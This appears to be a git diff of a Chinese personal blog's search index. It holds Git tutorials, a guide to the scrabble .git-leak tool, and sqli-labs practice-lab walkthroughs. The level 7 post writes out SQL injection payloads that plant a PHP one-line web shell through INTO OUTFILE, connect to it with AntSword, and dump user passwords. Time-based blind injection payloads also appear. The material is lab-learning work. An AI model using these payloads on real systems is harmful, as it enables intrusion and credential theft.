+<h1 id="Git的本地库和远程库的交互"><a href="#Git的本地库和远程库的交互" class="headerlink" title="Git的本地库和远程库的交互"></a>Git的本地库和远程库的交互</h1><p>团队内协作（不加入团队不可push修改远程库代码）</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108202115421.png" alt="image-20220108202115421"></p>
+<p>跨团队协作</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108211729222.png" alt="image-20220108211729222"></p>
+<h1 id="Git命令行操作"><a href="#Git命令行操作" class="headerlink" title="Git命令行操作"></a>Git命令行操作</h1><h2 id="本地库操作"><a href="#本地库操作" class="headerlink" title="本地库操作"></a>本地库操作</h2><h3 id="本地库初始化"><a href="#本地库初始化" class="headerlink" title="本地库初始化"></a>本地库初始化</h3><p>命令：<code>git init</code></p>
+<p>效果：<img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108212311272.png" alt="image-20220108212311272"></p>
+<p>注意：.git目录中存放的是本地库相关的子目录和文件，不要删除和修改</p>
+<h3 id="设置签名"><a href="#设置签名" class="headerlink" title="设置签名"></a>设置签名</h3><p>形式：</p>
+<p>用户名：随便输</p>
+<p>Email地址：随便输，不存在也没关系</p>
+<p>作用：区分不同开发人员</p>
+<p>辨析：这里设置的签名和远程库（代码托管中心）的账号和密码一点关系没有</p>
+<p>命令：<code>git config user.name 用户名</code>  </p>
+<p>​        ：<code>git config user.email 邮件地址</code>    项目级别</p>
+<p>​        ：<code>git config --global user.name 用户名</code></p>
+<p>​         :  <code>git config --global user.email 邮件地址</code>    系统用户级别</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108214655319.png" alt="image-20220108214655319"></p>
+<p>项目级别/仓库级别：仅在当前本地库范围内有效（即只在test文件夹内有效）</p>
+<p>系统用户级别：登录当前操作系统的用户范围，如图</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108213618080.png" alt="image-20220108213618080"></p>
+<p>若没设置，则默认是系统用户级别，若两个都有，则是项目级别。也就是项目级别优先于系统用户级别。</p>
+<p>若二者都没有是不允许的</p>
+<p>项目级别用户名和邮件地址保存在.git/config里面，如上图</p>
+<p>系统用户级别用户名和邮件地址保存在当前用户文件夹里，如图</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108215432512.png" alt="image-20220108215432512"></p>
+<p>通常只设置一个系统用户级别</p>
+<h3 id="添加提交和查看状态操作"><a href="#添加提交和查看状态操作" class="headerlink" title="添加提交和查看状态操作"></a>添加提交和查看状态操作</h3><p>查看当前库状态命令：<code>git status</code></p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108220013324.png" alt="image-20220108220013324"></p>
+<p>创建文件命令：<code>vim 文件名.文件类型</code>（创建后即使未提交，在windows文件夹中也可看到该文件）</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108220229743.png" alt="image-20220108220229743"></p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108220240175.png" alt="image-20220108220240175"></p>
+<p>按I键开始输入内容</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108220517621.png" alt="image-20220108220517621"></p>
+<p>编辑完成后按ESC然后输入<code>:wq</code>退出</p>
+<p>此时再输入<code>git status</code>可看到</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108221241830.png" alt="image-20220108221241830"></p>
+<p>将工作区文件放入暂存区命令：<code>git add 文件名.文件类型</code></p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108221653353.png" alt="image-20220108221653353"></p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193655903.png" alt="image-20220108193655903"></p>
+<p>放进去后，在用<code>git status</code>看一下状态，可知test.txt已经进入暂存区</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108222245958.png" alt="image-20220108222245958"></p>
+<p>若使用<code>git rm --cached test.txt</code>则又回到此状态</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108221241830.png" alt="image-20220108221241830"></p>
+<p>将暂存区文件提交到本地库命令：<code>git commit 文件名.文件类型</code></p>
+<p>vim编辑器中输入<code>:set nu</code>来查看行号</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108222950393.png" alt="image-20220108222950393"></p>
+<p>然后按I键来进行输入更改备注信息</p>
+<p>输入好后按ESC然后输入<code>:wq</code>退出</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108223450538.png" alt="image-20220108223450538"></p>
+<p>然后再看一下状态</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108223535612.png" alt="image-20220108223535612"></p>
+<p>利用<code>git commit --amend - “新的备注”</code>来更改备注信息，并用<code>git log</code>来查看历史版本</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108224049105.png" alt="image-20220108224049105"></p>
+<p>用<code>vim test.txt</code>继续编辑文件，加入一行“d”然后再查看状态</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108224800559.png" alt="image-20220108224800559"></p>
+<p>这里用<code>git add test.txt</code>按部就班的进行提交，然后查看状态</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108225112194.png" alt="image-20220108225112194"></p>
+<p>然后进行提交，这里用<code>git commit -m &quot;备注&quot; test.txt</code>进行提交，不用再在vim编辑器里输入备注信息</p>
+<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108225410302.png" alt="image-20220108225410302"></p>
 ]]></content>
       <tags>
         <tag>Git</tag>
@@ -2289,6 +2412,88 @@
       </tags>
   </entry>
   <entry>
+    <title>scrabble的使用</title>
+    <url>/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="scrabble介绍"><a href="#scrabble介绍" class="headerlink" title="scrabble介绍"></a>scrabble介绍</h1><p>scrabble适用常规的git泄露，用于获取源码。开发人员忘记.git文件，导致攻击者可以通过.git文件夹中的信息获取开发人员所提交过的源码。</p>
+<p>安装：<code>git clone https://github.com/denny0223/scrabble</code>(用在linux系统中)</p>
+<span id="more"></span>
+
+<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128143040320.png" alt="image-20220128143040320"></p>
+<p>有时候获取不到，多试几次，毕竟github有时候进不去，呜呜呜。</p>
+<h1 id="测试环境的搭建"><a href="#测试环境的搭建" class="headerlink" title="测试环境的搭建"></a>测试环境的搭建</h1><p>这里用Ubuntu和PHPstudy示范</p>
+<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128143248746.png" alt="image-20220128143248746"></p>
+<p>进入根目录后，创建test测试文件</p>
+<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128143340203.png" alt="image-20220128143340203"></p>
+<p>若出现如下情况，直接用命令行进入管理员模式访问吧。</p>
+<p>进入管理员模式：<code>su root</code>，然后输入密码即可，注意，密码输入后是不会显示的。</p>
+<p>然后切换到目的文件夹</p>
+<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128143610379.png" alt="image-20220128143610379"></p>
+<p>这里我已经创建了几个文档和一个文件夹，文档的创建过程见Git教程，文件夹的创建<code>mkdir 文件夹名</code></p>
+<p>所以，这里我们的测试网址应该是<code>http://127.0.0.1/test</code>。</p>
+<p>顺便补充一下，我这里还搭建了sqli-labs靶场，虚拟机内访问是<code>http://127.0.0.1/sqli-labs</code>，物理机访问是要把127.0.0.1换成虚拟机的IP v4地址。查看方法如下</p>
+<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128144009957.png" alt="image-20220128144009957"></p>
+<h1 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h1><p>按照图中的指令即可</p>
+<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128144150492.png" alt="image-20220128144150492"></p>
+<p>注意，这里用完后，原来scrabble文件夹中的内容就被目标网站中的源码取代了，所以建议备份scrabble源文件，要不还得git clone一下。获取后直接cat查看就可以了。但是我试了一下，这里并不能获得sqli-labs的源文件，目测是因为sqli-labs中.git文件夹中的信息不太友好，本地对其并没有操作。所以也就没有git提交记录。</p>
+<p><strong>还有一种情况是，flag会藏在老版本里，所以我们用scrabble获取源码后。输入<code>git log</code>查看以前版本，并切换，从而找到flag</strong></p>
+<p>再补充一下，<code>git reflog</code>版本信息更全，能够看更先进的版本（如果有的话）。而<code>git log</code>只能看老版本</p>
+]]></content>
+      <tags>
+        <tag>Git</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqlilabs第7关（上传木马）</title>
+    <url>/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/</url>
+    <content><![CDATA[<h1 id="配置关卡文件"><a href="#配置关卡文件" class="headerlink" title="配置关卡文件"></a>配置关卡文件</h1><p>首先，MySQL默认是不能通过sql上传文件的，具体请输入命令<code>show variables like &#39;%secure%&#39;</code> 查看</p>
+<p>若图中划红线的框为</p>
+<ul>
+<li><p>Null  不可上传</p>
+</li>
+<li><p>某一路径 只能在该路径及其子路径中上传</p>
+</li>
+<li><p>空   可以上传</p>
+<span id="more"></span></li>
+</ul>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124202815420.png" alt="image-20220124202815420"></p>
+<p>具体修改方法如下</p>
+<p>打开my.ini文件，并在[mysqld]栏中添加如下内容</p>
+<p><code>secure_file_priv=&quot;路径&quot;</code></p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124203529805.png" alt="image-20220124203529805"></p>
+<p>然后重启MySQL即可生效。</p>
+<p>以上步骤实际上是完善题目，因为此题本来就是用上传文件做，没法上传文件就是没法做。</p>
+<h1 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="判断闭合方式"></a>判断闭合方式</h1><p>首先输入<code>id=1&#39;</code>，报错；然后输入<code>id=1&#39;--+</code>，还是报错；接着输入<code>id=1&#39;)--+</code>，还是报错；最后尝试输入<code>id=1&#39;))--+</code>，这次终于对了，所以闭合方式就是单引号加双括号。</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204428285.png" alt="image-20220124204428285"></p>
+<h1 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h1><p>这个没啥好说的，直接<code>order by</code>即可最后得出是3</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204525136.png" alt="image-20220124204525136"></p>
+<h1 id="上传木马并连接"><a href="#上传木马并连接" class="headerlink" title="上传木马并连接"></a>上传木马并连接</h1><p><code>?id=1&#39;))union select 1,2,&quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\a.php&quot;--+</code>注意这里是<strong>双反斜杠</strong></p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204810866.png" alt="image-20220124204810866"></p>
+<p>然后查看靶机中相应的文件即可知道已经成功上传</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204957483.png" alt="image-20220124204957483"></p>
+<p>然后用中国蚁剑进行连接</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205105057.png" alt="image-20220124205105057"></p>
+<p>注意，这里要定位到a.php，而不是仅仅到Less-7文件夹，连接成功后如下图</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205159761.png" alt="image-20220124205159761"></p>
+<h1 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h1><p><code>?id=1&#39;))union select 1,2,database() into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\b.txt&quot;--+</code> 这里换成<strong>b.txt</strong>了</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205333775.png" alt="image-20220124205333775"></p>
+<p>用蚁剑查看</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205413565.png" alt="image-20220124205413565"></p>
+<p>可知当前数据库是<strong>security</strong></p>
+<h1 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h1><p><code>?id=1&#39;))union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\c.txt&quot;--+</code>这里改成<strong>c.txt</strong>了，若仍是b.txt，则原先的b.txt不会改变，也不会新增内容。</p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205728524.png" alt="image-20220124205728524"></p>
+<h1 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h1><p><code>?id=1&#39;))union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\d.txt&quot;--+</code></p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205953312.png" alt="image-20220124205953312"></p>
+<h1 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h1><p><code>?id=1&#39;))union select 1,2,group_concat(username,1,password) from security.users into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\e.txt&quot;--+</code></p>
+<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124210110521.png" alt="image-20220124210110521"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>其实就是上传了一个一句话木马，然后用蚁剑进行查看相应数据，指令大多和第一关相似。</p>
+<p>特别之处就是用了<code>into outfile&quot;路径&quot;</code>这个语句。</p>
+<p>最后想说的是，蚁剑真的可怕！！！</p>
+]]></content>
+      <tags>
+        <tag>SQL</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqlilabs第8-10关（盲注）</title>
     <url>/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/</url>
     <content><![CDATA[<h1 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h1><h2 id="判断闭合类型"><a href="#判断闭合类型" class="headerlink" title="判断闭合类型"></a>判断闭合类型</h2><p>?id=1’报错，?id=1’–+不报错，说明是单引号包裹。</p>
@@ -2351,57 +2556,6 @@
 <p><code>?id=1&#39; and if(ascii(substr((select password from users limit 0,1),1,1))=1,sleep(5),1)--+</code></p>
 <h1 id="第10关"><a href="#第10关" class="headerlink" title="第10关"></a>第10关</h1><p>除了闭合方式为双引号型，其余和第9关都一样</p>
 <p><code>?id=1&quot; and sleep(5)--+</code></p>
-]]></content>
-      <tags>
-        <tag>SQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqlilabs第7关（上传木马）</title>
-    <url>/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/</url>
-    <content><![CDATA[<h1 id="配置关卡文件"><a href="#配置关卡文件" class="headerlink" title="配置关卡文件"></a>配置关卡文件</h1><p>首先，MySQL默认是不能通过sql上传文件的，具体请输入命令<code>show variables like &#39;%secure%&#39;</code> 查看</p>
-<p>若图中划红线的框为</p>
-<ul>
-<li><p>Null  不可上传</p>
-</li>
-<li><p>某一路径 只能在该路径及其子路径中上传</p>
-</li>
-<li><p>空   可以上传</p>
-<span id="more"></span></li>
-</ul>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124202815420.png" alt="image-20220124202815420"></p>
-<p>具体修改方法如下</p>
-<p>打开my.ini文件，并在[mysqld]栏中添加如下内容</p>
-<p><code>secure_file_priv=&quot;路径&quot;</code></p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124203529805.png" alt="image-20220124203529805"></p>
-<p>然后重启MySQL即可生效。</p>
-<p>以上步骤实际上是完善题目，因为此题本来就是用上传文件做，没法上传文件就是没法做。</p>
-<h1 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="判断闭合方式"></a>判断闭合方式</h1><p>首先输入<code>id=1&#39;</code>，报错；然后输入<code>id=1&#39;--+</code>，还是报错；接着输入<code>id=1&#39;)--+</code>，还是报错；最后尝试输入<code>id=1&#39;))--+</code>，这次终于对了，所以闭合方式就是单引号加双括号。</p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204428285.png" alt="image-20220124204428285"></p>
-<h1 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h1><p>这个没啥好说的，直接<code>order by</code>即可最后得出是3</p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204525136.png" alt="image-20220124204525136"></p>
-<h1 id="上传木马并连接"><a href="#上传木马并连接" class="headerlink" title="上传木马并连接"></a>上传木马并连接</h1><p><code>?id=1&#39;))union select 1,2,&quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\a.php&quot;--+</code>注意这里是<strong>双反斜杠</strong></p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204810866.png" alt="image-20220124204810866"></p>
-<p>然后查看靶机中相应的文件即可知道已经成功上传</p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124204957483.png" alt="image-20220124204957483"></p>
-<p>然后用中国蚁剑进行连接</p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205105057.png" alt="image-20220124205105057"></p>
-<p>注意，这里要定位到a.php，而不是仅仅到Less-7文件夹，连接成功后如下图</p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205159761.png" alt="image-20220124205159761"></p>
-<h1 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h1><p><code>?id=1&#39;))union select 1,2,database() into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\b.txt&quot;--+</code> 这里换成<strong>b.txt</strong>了</p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205333775.png" alt="image-20220124205333775"></p>
-<p>用蚁剑查看</p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205413565.png" alt="image-20220124205413565"></p>
-<p>可知当前数据库是<strong>security</strong></p>
-<h1 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h1><p><code>?id=1&#39;))union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\c.txt&quot;--+</code>这里改成<strong>c.txt</strong>了，若仍是b.txt，则原先的b.txt不会改变，也不会新增内容。</p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205728524.png" alt="image-20220124205728524"></p>
-<h1 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h1><p><code>?id=1&#39;))union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\d.txt&quot;--+</code></p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124205953312.png" alt="image-20220124205953312"></p>
-<h1 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h1><p><code>?id=1&#39;))union select 1,2,group_concat(username,1,password) from security.users into outfile&quot;C:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\e.txt&quot;--+</code></p>
-<p><img src="/2022/01/24/sqlilabs%E7%AC%AC7%E5%85%B3/image-20220124210110521.png" alt="image-20220124210110521"></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>其实就是上传了一个一句话木马，然后用蚁剑进行查看相应数据，指令大多和第一关相似。</p>
-<p>特别之处就是用了<code>into outfile&quot;路径&quot;</code>这个语句。</p>
-<p>最后想说的是，蚁剑真的可怕！！！</p>
 ]]></content>
       <tags>
         <tag>SQL</tag>
@@ -2568,30 +2722,6 @@
       </tags>
   </entry>
   <entry>
-    <title>“解决codeblocks无法运行c++程序&quot;</title>
-    <url>/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/</url>
-    <content><![CDATA[<p>下载Codeblocks后，创建新程序后，发现点击运行后无法弹出控制台，如图</p>
-<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120305308.png" alt="image-20211127120305308"></p>
-<span id="more"></span>
-
-<p>#法1</p>
-<p>查看compiler setting中的路径，如下图</p>
-<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120458845.png" alt="image-20211127120458845"></p>
-<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120607794.png" alt="image-20211127120607794"></p>
-<p>修改MinGW的路径后，解决问题</p>
-<p>#法2（法1未解决）</p>
-<p>路径正常，修改路径后显示</p>
-<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120747653.png" alt="image-20211127120747653"></p>
-<p>即缺少GNU GCC Compiler，说白了就是MinGW文件不完整，尝试删除WinGW文件夹，然后重新下载</p>
-<p>下载地址：链接：<a href="https://pan.baidu.com/s/12OXmsCeZM2zIrK95WTs7Ag">https://pan.baidu.com/s/12OXmsCeZM2zIrK95WTs7Ag</a>    提取码：axen</p>
-<p>将该压缩包解压后，解决问题</p>
-<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127121331465.png" alt="image-20211127121331465"></p>
-]]></content>
-      <tags>
-        <tag>C++</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqlilabs第四关</title>
     <url>/2022/01/22/sqlilabs%E7%AC%AC%E5%9B%9B%E5%85%B3/</url>
     <content><![CDATA[<p>p判断闭合方式</p>
@@ -2624,6 +2754,30 @@
 ]]></content>
       <tags>
         <tag>SQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>“解决codeblocks无法运行c++程序&quot;</title>
+    <url>/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/</url>
+    <content><![CDATA[<p>下载Codeblocks后，创建新程序后，发现点击运行后无法弹出控制台，如图</p>
+<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120305308.png" alt="image-20211127120305308"></p>
+<span id="more"></span>
+
+<p>#法1</p>
+<p>查看compiler setting中的路径，如下图</p>
+<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120458845.png" alt="image-20211127120458845"></p>
+<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120607794.png" alt="image-20211127120607794"></p>
+<p>修改MinGW的路径后，解决问题</p>
+<p>#法2（法1未解决）</p>
+<p>路径正常，修改路径后显示</p>
+<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120747653.png" alt="image-20211127120747653"></p>
+<p>即缺少GNU GCC Compiler，说白了就是MinGW文件不完整，尝试删除WinGW文件夹，然后重新下载</p>
+<p>下载地址：链接：<a href="https://pan.baidu.com/s/12OXmsCeZM2zIrK95WTs7Ag">https://pan.baidu.com/s/12OXmsCeZM2zIrK95WTs7Ag</a>    提取码：axen</p>
+<p>将该压缩包解压后，解决问题</p>
+<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127121331465.png" alt="image-20211127121331465"></p>
+]]></content>
+      <tags>
+        <tag>C++</tag>
       </tags>
   </entry>
   <entry>
@@ -2928,6 +3082,42 @@
       </tags>
   </entry>
   <entry>
+    <title>刷题记录-7</title>
+    <url>/2022/04/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-7/</url>
+    <content><![CDATA[<h1 id="Pretty-Horrible-Program-1"><a href="#Pretty-Horrible-Program-1" class="headerlink" title="Pretty Horrible Program 1"></a>Pretty Horrible Program 1</h1><p>这道题水得很，虽然我没有完全看懂源码，但也能稍作注释</p>
+<span id="more"></span>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;bingus&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;bingus&#x27;</span>];  <span class="comment">//把get到的值赋给input</span></span><br><span class="line">    <span class="variable">$to_replace</span> = <span class="string">&#x27;bingus&#x27;</span>;  <span class="comment">//让to_replace为bingus</span></span><br><span class="line">    <span class="variable">$clean_string</span> = preg_replace(<span class="string">&quot;/<span class="subst">$to_replace</span>/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$input</span>);<span class="comment">//让clean_string为input中把bingus替换为空格后的值</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your string is: <span class="subst">$clean_string</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$clean_string</span> == <span class="variable">$to_replace</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;h2 class=\&quot;answer\&quot;&gt;Bingus &lt;span style=\&quot;color: green;\&quot;&gt;IS&lt;/span&gt; your beloved&lt;/h2&gt;&quot;</span>;  <span 